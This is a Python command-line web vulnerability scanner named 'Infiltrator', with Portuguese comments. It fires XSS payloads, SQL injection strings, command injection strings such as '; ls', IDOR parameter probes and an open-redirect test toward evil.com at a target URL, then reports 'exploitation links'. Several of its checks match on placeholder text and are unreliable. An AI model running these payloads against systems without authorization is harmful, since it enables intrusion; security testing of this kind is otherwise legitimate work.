#!/usr/bin/python3

import requests
import re
import sys
import click
import json
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
import logging

# Configuração do logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def mostrar_banner():
    banner = """
    ##################################
    #                                #
    #        Infiltrator             #
    #   Criado por Victor            #
    #                                #
    ##################################
    """
    print(banner)

def buscar_conteudo_na_url(url, method='GET', headers=None, data=None, params=None, auth=None):
    try:
        response = requests.request(method, url, headers=headers, data=data, params=params, auth=auth)
        response.raise_for_status()
        return True, response.text
    except requests.RequestException as e:
        logging.error(f"Erro ao acessar a URL: {e}")
        return False, f"Erro ao acessar a URL: {e}"

def gerar_link_absoluto(base_url, url_fragment):
    return urljoin(base_url, url_fragment)

def verificar_xss_vulnerabilidade(url):
    vulnerabilidades = []
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<input type='text' value='<script>alert(1)</script>'>"
    ]
    
    for payload in xss_payloads:
        encoded_payload = urlencode({'test': payload})
        test_url = f"{url}?{encoded_payload}"
        response = requests.get(test_url)
        if payload in response.text:
            vulnerabilidades.append({
                'vulnerabilidade': 'XSS',
                'localizacao': f"URL: {test_url} - Payload: {payload}",
                'link_exploracao': test_url,
                'exemplo': f'Exemplo de Exploração: Tente usar {payload}.'
            })
    return vulnerabilidades

def verificar_idor_vulnerabilidade(url):
    vulnerabilidades = []
    base_url = f"{urlparse(url).scheme}://{urlparse(url).hostname}"
    parametros = ['id', 'user_id', 'account_id', 'token', 'file_id', 'product_id']
    
    for parametro in parametros:
        test_url = f"{base_url}/?{parametro}=1"  # Modificar para valor de teste apropriado
        response = requests.get(test_url)
        if "dados inesperados" in response.text:  # Ajuste a verificação conforme o comportamento esperado
            vulnerabilidades.append({
                'vulnerabilidade': 'IDOR',
                'localizacao': f"URL: {test_url} - Parâmetro: {parametro}",
                'link_exploracao': test_url,
                'exemplo': f'Exemplo de Exploração: Tente usar {parametro}=1 para verificar acesso não autorizado.'
            })
    return vulnerabilidades

def verificar_open_redirects(url):
    vulnerabilidades = []
    test_redirect_url = f"{url}?redirect=http://evil.com"
    response = requests.get(test_redirect_url, allow_redirects=False)
    
    if response.status_code == 302 and 'evil.com' in response.headers.get('Location', ''):
        vulnerabilidades.append({
            'vulnerabilidade': 'Open Redirect',
            'localizacao': f"URL: {test_redirect_url} - Redirecionado para: {response.headers.get('Location')}",
            'link_exploracao': test_redirect_url,
            'exemplo': 'Exemplo de Exploração: Verifique se o redirecionamento leva para http://evil.com.'
        })
    return vulnerabilidades

def verificar_sql_injection(url):
    vulnerabilidades = []
    sql_payloads = [
        "' OR 1=1 --",
        '" OR 1=1 --'
    ]
    
    for payload in sql_payloads:
        encoded_payload = urlencode({'search': payload})
        test_url = f"{url}?{encoded_payload}"
        response = requests.get(test_url)
        if "erro de SQL" in response.text:  # Ajuste conforme erros esperados
            vulnerabilidades.append({
                'vulnerabilidade': 'SQL Injection',
                'localizacao': f"URL: {test_url} - Payload: {payload}",
                'link_exploracao': test_url,
                'exemplo': f'Exemplo de Exploração: Tente injetar SQL como {payload}.'
            })
    return vulnerabilidades

def verificar_command_injection(url):
    vulnerabilidades = []
    command_payloads = [
        "; ls",
        "&& ls",
        "| ls"
    ]
    
    for payload in command_payloads:
        encoded_payload = urlencode({'cmd': payload})
        test_url = f"{url}?{encoded_payload}"
        response = requests.get(test_url)
        if "listagem de arquivos" in response.text:  # Ajuste conforme a saída esperada
            vulnerabilidades.append({
                'vulnerabilidade': 'Command Injection',
                'localizacao': f"URL: {test_url} - Payload: {payload}",
                'link_exploracao': test_url,
                'exemplo': f'Exemplo de Exploração: Tente injetar comandos do sistema como {payload}.'
            })
    return vulnerabilidades

def verificar_sensitive_data_exposure(url):
    vulnerabilidades = []
    sensitive_data_patterns = [r'(password|secret|token|api_key|key|ssn|credit_card|social_security_number)']
    
    for pattern in sensitive_data_patterns:
        response = requests.get(url)
        if re.search(pattern, response.text, re.IGNORECASE):
            vulnerabilidades.append({
                'vulnerabilidade': 'Exposição de Dados Sensíveis',
                'localizacao': f"URL: {url} - Dado Sensível Encontrado",
                'link_exploracao': None,
                'exemplo': 'Verifique se há dados sensíveis expostos e se estão devidamente protegidos.'
            })
    return vulnerabilidades

def gerar_relatorio_vulnerabilidades(vulnerabilidades):
    relatorio = "Relatório de Vulnerabilidades Encontradas:\n\n"
    for vulnerabilidade in vulnerabilidades:
        relatorio += f"Vulnerabilidade: {vulnerabilidade['vulnerabilidade']}\n"
        relatorio += f"Localização: {vulnerabilidade['localizacao']}\n"
        if vulnerabilidade['link_exploracao']:
            relatorio += f"Link para Exploração: {vulnerabilidade['link_exploracao']}\n"
        relatorio += f"Exemplo de Exploração: {vulnerabilidade['exemplo']}\n"
        relatorio += "\n"
    return relatorio

def realizar_web_scraping(conteudo):
    soup = BeautifulSoup(conteudo, 'html.parser')
    elementos = {
        'links': [a['href'] for a in soup.find_all('a', href=True)],
        'imagens': [img['src'] for img in soup.find_all('img', src=True)]
    }
    return elementos

def verificar_vulnerabilidades(url, headers=None, params=None, auth=None, method='GET', data=None, fast=False, check_xss=False, check_idor=False, check_redirects=False, check_sql=False, check_command=False, check_data=False):
    valido, conteudo = buscar_conteudo_na_url(url, method, headers=headers, data=data, params=params, auth=auth)
    if not valido:
        print(conteudo)
        return []

    elementos = realizar_web_scraping(conteudo)
    vulnerabilidades = []

    if fast or (check_xss and check_idor and check_redirects and check_sql and check_command and check_data):
        # Verificação rápida: todas as vulnerabilidades
        vulnerabilidades.extend(verificar_xss_vulnerabilidade(url))
        vulnerabilidades.extend(verificar_idor_vulnerabilidade(url))
        vulnerabilidades.extend(verificar_open_redirects(url))
        vulnerabilidades.extend(verificar_sql_injection(url))
        vulnerabilidades.extend(verificar_command_injection(url))
        vulnerabilidades.extend(verificar_sensitive_data_exposure(url))
    else:
        # Verificação conforme opções especificadas
        if check_xss:
            vulnerabilidades.extend(verificar_xss_vulnerabilidade(url))
        if check_idor:
            vulnerabilidades.extend(verificar_idor_vulnerabilidade(url))
        if check_redirects:
            vulnerabilidades.extend(verificar_open_redirects(url))
        if check_sql:
            vulnerabilidades.extend(verificar_sql_injection(url))
        if check_command:
            vulnerabilidades.extend(verificar_command_injection(url))
        if check_data:
            vulnerabilidades.extend(verificar_sensitive_data_exposure(url))

    # Aplicar verificações de vulnerabilidades aos elementos encontrados pelo scraping
    for link in elementos.get('links', []):
        # Aqui você pode ajustar as verificações para links encontrados, se necessário
        pass
    for imagem in elementos.get('imagens', []):
        # Aqui você pode ajustar as verificações para imagens encontradas, se necessário
        pass

    return vulnerabilidades

def imprimir_ajuda():
    ajuda_texto = """
Uso: python3 scanner.py [opções] URL

Opções:
  -h, --help            Mostrar esta mensagem de ajuda e sair
  -f, --fast            Realizar uma verificação rápida (todas as vulnerabilidades)
  -a, --all             Verificar todas as vulnerabilidades
  -c, --check-xss       Verificar vulnerabilidades XSS
  -d, --check-idor      Verificar vulnerabilidades IDOR
  -r, --check-redirects Verificar vulnerabilidades de redirecionamento aberto
  -s, --check-sql       Verificar vulnerabilidades de SQL Injection
  -m, --check-command   Verificar vulnerabilidades de Command Injection
  -e, --check-data      Verificar exposição de dados sensíveis
"""
    print(ajuda_texto)

@click.command()
@click.argument('url')
@click.option('-f', '--fast', is_flag=True, help='Realizar uma verificação rápida (todas as vulnerabilidades)')
@click.option('-a', '--all', is_flag=True, help='Verificar todas as vulnerabilidades')
@click.option('-c', '--check-xss', is_flag=True, help='Verificar vulnerabilidades XSS')
@click.option('-d', '--check-idor', is_flag=True, help='Verificar vulnerabilidades IDOR')
@click.option('-r', '--check-redirects', is_flag=True, help='Verificar vulnerabilidades de redirecionamento aberto')
@click.option('-s', '--check-sql', is_flag=True, help='Verificar vulnerabilidades de SQL Injection')
@click.option('-m', '--check-command', is_flag=True, help='Verificar vulnerabilidades de Command Injection')
@click.option('-e', '--check-data', is_flag=True, help='Verificar exposição de dados sensíveis')
def main(url, fast, all, check_xss, check_idor, check_redirects, check_sql, check_command, check_data):
    mostrar_banner()

    if all:
        fast = True
        check_xss = True
        check_idor = True
        check_redirects = True
        check_sql = True
        check_command = True
        check_data = True

    if not (fast or check_xss or check_idor or check_redirects or check_sql or check_command or check_data):
        imprimir_ajuda()
        sys.exit(1)

    vulnerabilidades = verificar_vulnerabilidades(
        url,
        fast=fast,
        check_xss=check_xss,
        check_idor=check_idor,
        check_redirects=check_redirects,
        check_sql=check_sql,
        check_command=check_command,
        check_data=check_data
    )

    if vulnerabilidades:
        relatorio = gerar_relatorio_vulnerabilidades(vulnerabilidades)
        print(relatorio)
    else:
        print("Nenhuma vulnerabilidade encontrada.")

if __name__ == '__main__':
    main()
